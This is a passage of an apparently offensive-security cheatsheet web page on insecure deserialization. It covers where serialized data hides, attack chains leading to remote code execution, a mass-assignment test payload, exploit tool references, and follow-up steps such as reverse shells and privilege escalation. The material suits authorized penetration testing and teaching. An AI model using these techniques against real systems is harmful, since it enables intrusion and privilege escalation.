+<p>This makes LFI on PHP apps especially dangerous when uploads are allowed (any extension) - see [[WEB13 File Upload &amp; LFI]].</p>
+<h2 id="vi-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">vi. Tricks worth knowing</span>
+    <a class="heading-permalink" href="#vi-tricks-worth-knowing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="look-for-serialized-data-even-when-not-obvious" data-heading-permalink="true"><span class="heading-content">Look for serialized data even when not obvious</span>
+    <a class="heading-permalink" href="#look-for-serialized-data-even-when-not-obvious" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Decode every base64 string. Inspect every binary blob in cookies. The deserialization sink is often hidden:</p>
+<ul>
+<li>A &ldquo;remember me&rdquo; cookie that base64-encodes a user blob</li>
+<li>A &ldquo;previous form data&rdquo; cookie for autofill</li>
+<li>A &ldquo;Last URL visited&rdquo; tracking cookie</li>
+</ul>
+<h3 id="custom-serialization-isnt-safe-either" data-heading-permalink="true"><span class="heading-content">Custom serialization isn&rsquo;t safe either</span>
+    <a class="heading-permalink" href="#custom-serialization-isnt-safe-either" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some apps use custom serialization formats. If user input flows into ANY untrusted-input-to-object-construction path, similar risks apply. Look at the source if possible.</p>
+<h3 id="length-prefix-bugs" data-heading-permalink="true"><span class="heading-content">Length-prefix bugs</span>
+    <a class="heading-permalink" href="#length-prefix-bugs" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some deserializers process data based on length headers. Mismatched length can cause weird parsing behaviors → smuggling-like attacks within deserialization streams.</p>
+<h3 id="chained-polyglot---combine-with-other-bugs" data-heading-permalink="true"><span class="heading-content">Chained polyglot - combine with other bugs</span>
+    <a class="heading-permalink" href="#chained-polyglot---combine-with-other-bugs" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>File upload + phar deserialization = RCE (PHP)</li>
+<li>XXE → DTD with deserialization payload = chained</li>
+<li>SSRF + internal queue access + deserializable queue message = chained RCE</li>
+</ul>
+<h3 id="identify-mass-assignment-too" data-heading-permalink="true"><span class="heading-content">Identify mass assignment too</span>
+    <a class="heading-permalink" href="#identify-mass-assignment-too" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some &ldquo;deserialization-like&rdquo; bugs are actually mass assignment (the app maps JSON keys to object properties). Test:</p>
+<pre tabindex="0"><code>{&#34;isAdmin&#34;: true, &#34;role&#34;: &#34;admin&#34;}
+</code></pre><p>Even when proper deserialization isn&rsquo;t possible, type confusion / mass assignment can be present.</p>
+<h3 id="validate-gadget-chain-works-locally-first" data-heading-permalink="true"><span class="heading-content">Validate gadget chain works locally first</span>
+    <a class="heading-permalink" href="#validate-gadget-chain-works-locally-first" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Set up a test instance with the suspected library versions. Verify your chain triggers RCE locally before sending to target. Saves time fishing through 100 chains in the dark.</p>
+<h2 id="vii-references" data-heading-permalink="true"><span class="heading-content">vii. References</span>
+    <a class="heading-permalink" href="#vii-references" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener noreferrer">PortSwigger - Insecure deserialization</a>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - Insecure Deserialization</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization" target="_blank" rel="noopener noreferrer">HackTricks - Deserialization</a>
+</li>
+<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreferrer">ysoserial</a>
+ - Java</li>
+<li><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener noreferrer">ysoserial.net</a>
+ - .NET</li>
+<li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreferrer">PHPGGC</a>
+ - PHP</li>
+<li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">marshalsec</a>
+ - multi-protocol Java deserialization</li>
+<li><a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener noreferrer">gadgetinspector</a>
+ - find new Java chains</li>
+<li><a href="https://github.com/ambionics/phpggc/blob/master/README.md" target="_blank" rel="noopener noreferrer">phpggc readme</a>
+ - covers phar wrapper extensively</li>
+</ul>
+<h2 id="viii-where-it-leads" data-heading-permalink="true"><span class="heading-content">viii. Where it leads</span>
+    <a class="heading-permalink" href="#viii-where-it-leads" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Almost every successful deserialization = RCE in the deserializing process. Next steps:</p>
+<ul>
+<li>Stable callback via [[Reverse Shells]]</li>
+<li>Local enum on the foothold → [[05 Local Enum]] or [[W02 Local Enum]]</li>
+<li>Find more bugs / creds in the now-readable app source → [[11 PrivEsc - Credentials &amp; Files]] / [[W06 PrivEsc - Credentials &amp; Files]]</li>
+<li>If on cloud → metadata endpoint, see [[Cloud Recon]]</li>
+<li>Move into AD if domain-joined → [[00 AD MOC]]</li>
+</ul>
+<p>Deserialization RCE often runs as the application service account (Tomcat user, www-data, IIS apppool identity). Often comes with <code>SeImpersonatePrivilege</code> on Windows → instant SYSTEM via Potato attacks, see [[W03 PrivEsc - Tokens &amp; Privileges]].</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web13-file-upload--lfi/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">File Upload &amp; LFI</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web15-prototype-pollution/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">WEB15 Prototype Pollution</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
